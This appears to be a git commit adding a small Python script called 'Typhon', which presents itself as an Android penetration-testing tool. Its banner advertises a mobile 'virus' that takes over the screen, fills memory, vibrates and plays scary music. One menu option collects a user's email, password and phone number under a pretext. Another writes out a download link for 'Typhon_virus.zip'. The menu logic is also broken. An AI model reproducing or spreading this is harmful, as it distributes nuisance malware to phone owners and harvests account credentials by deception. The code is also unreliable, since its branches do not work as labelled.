edc3aaa493269da46aa423e38099ad49ddd7c02d
Conex-Banana <109140672+Mr-Banana-2045@users.noreply.github.com>
2022-07-12 03:08:15 -0700

    TYPHON

---
+++ Typhon_virus.pyi
@@ -0,0 +1,56 @@
+class color:
+	red = '\33[91m'
+	blue = '\33[94m'
+	green = '\33[92m'
+	zard = '\33[93m'
+print(f"""{color.blue}
+           ....'''..          ...''....           
+        ....','''...'.      ..'...'',,'...        
+      ..';:ldxddoc,.''.    ..'..:ldddxoc:,'.      
+     .':oxolc:;,lo,..'.. ...''..cd:;:clldxl;.     
+    .;dxc'.;,....'.,codxxxxddl:..,...','.;oxl'               #-------------------------#
+    .ox:.''';. ...:OXKKKKKKKKKKd'....',''''cx:.                     {color.zard}tools Typhon{color.blue}
+   ..,;'..''''...'oKXKKKKKKKKXXO:......''..';'.              #-------------------------#
+  ....,,;:'.',,...:xkOO0KKK0OOko,..','..;:;,'.'.             name tools : Typhon
+ ..':lxxodc..';'.';;lkO0OOOOOd:,;..,,'.,oddxdc,..            Tool efficiency :Occupying the mobile
+..'cxxl,.',...,;.....':cllc:;.....,:'..',.':dko;..           screen, filling the memory, constantl
+.'lko:,........;;.::...''.''.',c,':,.......',cxd;'           y vibrating, playing scary music
+.;ko.',,'......,:;;:clo:..'lolc:;:;'......','.;ko'           creator : Mr Banana
+.lOc.',,:cc,....;;',c:lolooocc:.,:'...';c:;;'.'dx;           Software version : 1.1.0
+.;xo,;cccokxoc:'..,OXkddooddd0Ko...,cldkxlccc,;do'           channel : God developers
+ .....''',;:oO00kkOOxOXK000XKkkOkkO00kc:;''','....
+  ..','.....,cdkOOk:,dKKOx0XOc,oOOkko;'....',,'.  
+   .'.........,cl:'.l0Ox,.cO0O,.;cl:.........''.  
+   .'.... .........cOOl'. .:x0x,..'.....  ...''.  
+   ...',. .',,'..'okxo:....,ldkk:...,,'.  ',...   
+    ..,c;..',:,.'dxl:,......';cdkc..;:,..'::'..   
+     ..,:::;,'..lxc,...    ....;ox:..,,:::;'.     
+        ..'... .ol'...      ....;dc. ..''..       
+           .....c:..;:.    .;c'.'l;....           
+           .....:c..'c,    .c:..,l;....           
+            ....'c:,,;.    .';,;l:. ..            
+                 .,,'.      ..,,'.                
+Typhoon tool is a powerful tool in the field of Android penetration testing
+               GITHUB[ https://github.com/wex.by ]
+   
+{color.red}/ 0 \ {color.green}password the file virus mobile
+{color.red}/ 1 \ {color.green}download virus Typhon
+{color.red}/ 2 \{color.green} help
+""")
+num = float(input(f"{color.red}[#]{color.blue} number test tools ?>"))
+if num >= 0:
+    if num == 0:
+        nom = input(f"{color.red}[#]{color.green}Enter your email ?> ")
+        momo = input(f"{color.red}[#]{color.green}Enter your password ?> ")
+        number = input(f"{color.red}[#]{color.green}Enter your numbet ?> ")
+        l = ["128610","284739","376453","015296","846357","564738"]
+        for i in l:
+        	print("\r" +"code :", i, end="")
+    else:
+         hol = input(f"{color.red}[#]{color.green}Enter your code ?> ")
+         with open("file_apk_Typhon.txt",'w') as f:
+            f.write("""download file : https://imgurl.ir/uploads/i868863_Typhon_virus.zip""")
+            f.close()
+else:
+    print("""{color.green}
+    0_ In this section you can create your account and get a password 1_ In this section, you can receive the file as a password and paste the same password that you received in the zero section. 2_ In this section you can check the details""")
